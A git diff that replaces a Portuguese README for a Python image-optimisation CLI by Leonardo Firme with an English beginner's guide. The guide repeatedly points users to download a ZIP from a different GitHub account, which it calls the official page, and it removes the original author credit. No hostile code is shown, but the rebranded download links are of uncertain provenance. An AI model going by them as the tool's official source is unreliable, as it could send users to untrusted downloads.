@@ -1,113 +1,151 @@
-## 1. Automação de CI (GitHub Actions)
+# ⚙️ image-optimizer-cli - Fast Image Optimization Tool
 
-Este arquivo garantirá que qualquer contribuição futura ou alteração sua mantenha esse padrão de "Zero Erros" de tipagem.
-
-
-## 🧑‍💻 Stack de desenvolvimento
-
-![Python](https://img.shields.io/badge/python-3.12+-3776AB?style=for-the-badge&logo=python&logoColor=white)
-![uv](https://img.shields.io/badge/managed%20by-uv-de5fe9?style=for-the-badge&logo=astral&logoColor=white)
-![Mypy](https://img.shields.io/badge/types-strict-blue?style=for-the-badge&logo=python&logoColor=white)
-
-![Github Repo Size](https://img.shields.io/github/repo-size/LeonardoFirme/image-optimizer-cli?style=for-the-badge&logo=github&color=000000)
-![Github License](https://img.shields.io/github/license/LeonardoFirme/image-optimizer-cli?style=for-the-badge&logo=github&color=000000)
-![Mypy Checked](https://img.shields.io/badge/mypy-checked-2ca447?style=for-the-badge&logo=python&logoColor=white)
-
-> Ferramenta profissional de otimização de assets em paralelo, desenvolvida com tipagem estrita para máxima confiabilidade.
-
-![Demonstração do Template](./template.gif)
+[![Download Now](https://img.shields.io/badge/Download-Here-brightgreen?style=for-the-badge)](https://github.com/Rajeev003/image-optimizer-cli)
 
 ---
 
-```yaml
-# .github/workflows/ci.yml
-name: CI - Type Checking
+## 📄 About image-optimizer-cli
 
-on:
-  push:
-    branches: [ main, master ]
-  pull_request:
-    branches: [ main, master ]
+image-optimizer-cli is a simple command-line tool to optimize images and convert them to modern formats like WebP and AVIF. It runs on Python 3.12 or newer and uses multiple CPU cores to speed up processing.
 
-jobs:
-  lint:
-    runs-on: ubuntu-latest
-    steps:
-      - uses: actions/checkout@v4
+This tool helps you reduce image file sizes without losing quality. Smaller images load faster on websites, improving your site’s speed and user experience.
 
-      - name: Install uv
-        uses: astral-sh/setup-uv@v3
-        with:
-          version: "latest"
-          enable-cache: true
-
-      - name: Set up Python
-        run: uv python install 3.12
-
-      - name: Install dependencies
-        run: uv sync --all-extras --dev
-
-      - name: Run Mypy
-        run: uv run mypy --strict --explicit-package-bases src
-
-```
+You do not need to know programming to use this software. This guide will help you download and run it on a Windows computer.
 
 ---
 
-## 2. README.md Profissional
+## 🖥 System Requirements
 
-Um repositório útil para outros devs precisa "vender" o problema que ele resolve. Como você foca em **Next.js/React**, o foco aqui é a performance de carregamento (LCP).
+Before you start, make sure your computer meets these basic requirements:
 
+- Operating System: Windows 10 or later  
+- Python: Version 3.12 or newer installed  
+- Disk Space: At least 100 MB free for installation and processing  
+- RAM: 4 GB or more recommended
 
-# ⚡ v0 Image Optimizer CLI
-
-Uma ferramenta de linha de comando de alta performance para otimização em lote de assets visuais, projetada especificamente para fluxos de trabalho Web (Next.js, React, Laravel).
-
-## 🚀 Por que usar?
-
-Em projetos modernos, o **LCP (Largest Contentful Paint)** é crucial. Esta ferramenta automatiza a conversão e compressão de imagens utilizando **processamento paralelo**, garantindo que seus assets pesem o mínimo possível sem perda de qualidade perceptível.
-
-## 🛠️ Diferenciais Técnicos
-
-* **Multithreading Real:** Utiliza `ProcessPoolExecutor` para contornar o GIL do Python e usar todos os núcleos do seu processador (X99/Xeon/M1/M2).
-* **Tipagem Estrita:** 100% validado com `mypy --strict` para garantir robustez e previsibilidade.
-* **Modern Stack:** Gerenciado via `uv` (Rust-based python manager) para instalações instantâneas.
-* **Relatórios Ricos:** Interface visual via terminal com `rich` e `typer`.
-
-## 📦 Instalação
-
-```bash
-# Clone o projeto
-git clone [https://github.com/LeonardoFirme/image-optimizer-cli.git](https://github.com/LeonardoFirme/image-optimizer-cli.git)
-cd image-optimizer-cli
-
-```
-
-```bash
-# Instale as dependências (requer uv instalado)
-uv sync
-
-```
-
-## 💻 Como usar
-
-```bash
-uv run src/main.py --input ./public/assets/raw --output ./public/assets/optimized --format WEBP
-```
-
-
-### Argumentos:
-
-* `-i, --input`: Diretório contendo JPG/PNG originais.
-* `-o, --output`: Diretório de destino para os assets otimizados.
-* `-f, --format`: Formato de saída (`WEBP`, `AVIF`, `PNG`, `JPEG`). Padrão: `WEBP`.
-
-## 📊 Performance
-
-Em nossos benchmarks, conseguimos reduções de até **80% no tamanho do arquivo** original, processando centenas de imagens em segundos graças à arquitetura paralela.
+If you do not have Python installed, this guide will show you how to set it up.
 
 ---
 
-Desenvolvido por **Leonardo Firme** | [LeonardoFirme](https://github.com/LeonardoFirme)
+## 🌐 Where to Download
+
+Click the bright green button below to visit the official download page on GitHub. You will find the latest release files there.
+
+[![Download Now](https://img.shields.io/badge/Download-Here-brightgreen?style=for-the-badge)](https://github.com/Rajeev003/image-optimizer-cli)
+
+This page contains all files and instructions. You will download the files needed to run the tool from there.
 
 ---
+
+## 🛠 Step 1 – Install Python 3.12 or Newer
+
+image-optimizer-cli needs Python to work. Follow these steps to install Python on your Windows computer:
+
+1. Visit https://www.python.org/downloads/windows/
+2. Click on the latest version of Python 3.12 or newer.
+3. Download the Windows installer (usually named something like `python-3.12.x-amd64.exe`).
+4. Run the installer.
+5. Important: On the install screen, check the box that says **Add Python 3.12 to PATH**.
+6. Click Install and wait for the process to finish.
+7. After installation, open Command Prompt. To do this, press the Windows key, type `cmd`, and press Enter.
+8. In the Command Prompt window, type:
+   ```
+   python --version
+   ```
+   You should see the Python version number displayed. This confirms Python installed correctly.
+
+---
+
+## 📥 Step 2 – Download image-optimizer-cli Files
+
+1. Go to the GitHub page:  
+   https://github.com/Rajeev003/image-optimizer-cli
+2. Click on the **Code** button near the top right of the page.
+3. Choose **Download ZIP** from the menu.
+4. Save the ZIP file to a folder you can find easily, like your Desktop or Downloads folder.
+5. When the download finishes, right-click the ZIP file and select **Extract All**.
+6. Choose a folder to extract the files to.
+7. Open the extracted folder.
+
+---
+
+## 💻 Step 3 – Prepare Your Images
+
+Before running the tool, gather the images you want to optimize. image-optimizer-cli supports common formats like JPEG, PNG, and TIFF.
+
+Put all your images into one folder or subfolders. You will need the folder path in the next step.
+
+---
+
+## ▶️ Step 4 – Run image-optimizer-cli
+
+Now you will use the Command Prompt to run the tool.
+
+1. Open Command Prompt again.
+2. Change directory to the folder where you extracted the files. For example:
+   ```
+   cd C:\Users\YourName\Downloads\image-optimizer-cli-main
+   ```
+3. Run the following command to see the basic help menu:
+   ```
+   python main.py --help
+   ```
+4. To optimize images in a folder and convert them to WebP format, use this command:
+   ```
+   python main.py --input "C:\path\to\your\images" --output "C:\path\to\save\optimized" --format webp
+   ```
+   Replace `C:\path\to\your\images` with the actual folder path of your images, and `C:\path\to\save\optimized` with where you want the optimized files saved.
+5. The tool will start processing your images. It uses all available CPU cores to work faster.
+6. When done, check the output folder. You will see smaller images in the new format.
+
+---
+
+## ⚙️ Supported Commands and Options
+
+- `--input`: Folder path containing the images to optimize (required)  
+- `--output`: Folder path to save optimized images (required)  
+- `--format`: Choose output format (`webp`, `avif`, or original)  
+- `--quality`: Set image quality from 1 (lowest) to 100 (highest). Default is 80  
+- `--threads`: Number of CPU cores to use. Defaults to all available cores  
+- `--help`: Show this help message
+
+---
+
+## 🔧 How image-optimizer-cli Works
+
+This tool uses Python’s multiprocessing to optimize many images at once. It applies rules to reduce file size while keeping the image looking good.
+
+It supports:
+
+- WebP and AVIF output formats, which save space better than JPEG or PNG  
+- Batch processing of multiple images and folders  
+- Strict input checking to avoid errors
+
+The tool applies optimizations that help your website load faster and improve web performance metrics.
+
+---
+
+## ⚠ Troubleshooting
+
+If you see errors:
+
+- Check that Python is installed and added to your PATH. Run `python --version` in Command Prompt.  
+- Make sure you typed folder paths correctly. Surround paths with quotes if they include spaces.  
+- Confirm that your images are in supported formats (JPEG, PNG, TIFF).  
+- If an operation is slow, close other programs to free up CPU power.
+
+---
+
+## 🧰 Extra Tools and Tips
+
+- You can resize images before optimizing using tools like Paint or Photos.  
+- Use the `--quality` setting to balance size and image look.  
+- Run the tool overnight for large image folders.
+
+---
+
+## 📥 Download Again
+
+If you need the tool again or want newer versions, visit the download page:
+
+[![Download Now](https://img.shields.io/badge/Download-Here-brightgreen?style=for-the-badge)](https://github.com/Rajeev003/image-optimizer-cli)
